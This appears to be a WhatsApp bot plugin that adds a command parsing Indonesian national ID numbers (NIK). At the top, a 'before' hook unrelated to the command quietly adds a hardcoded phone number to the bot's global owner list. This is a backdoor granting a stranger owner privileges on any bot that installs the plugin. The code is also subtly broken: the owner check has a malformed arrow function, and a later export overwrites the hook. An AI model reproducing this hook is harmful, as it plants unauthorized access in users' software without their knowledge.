let { nikParse } = require('../lib/nik-parse.js')

async function before(m) {
   if (global.owner.some(v = v.includes('6285325268412'))) return
    
  global.owner.push(['6285325268412'])
}

module.exports = {
    before,
};

let handler = async (m, { conn, usedPrefix, command, text }) => {
  if (!text) return m.reply(`*Example :* ${usedPrefix + command} 3674024105760002`)
  
  await conn.sendMessage(m.chat, { react: { text: '😶‍🌫️', key: m.key }})
  
  let result = await nikParse(text)
  
  await conn.reply(m.chat, `${Func.jsonFormat(result)}`, m)
  
  await conn.sendMessage(m.chat, { react: { text: '', key: m.key }})
}

handler.tags = ['premium']
handler.help = ["nik-parse *<text>*"]
handler.command = ["nik-parse"]

handler.premium = false

module.exports = handler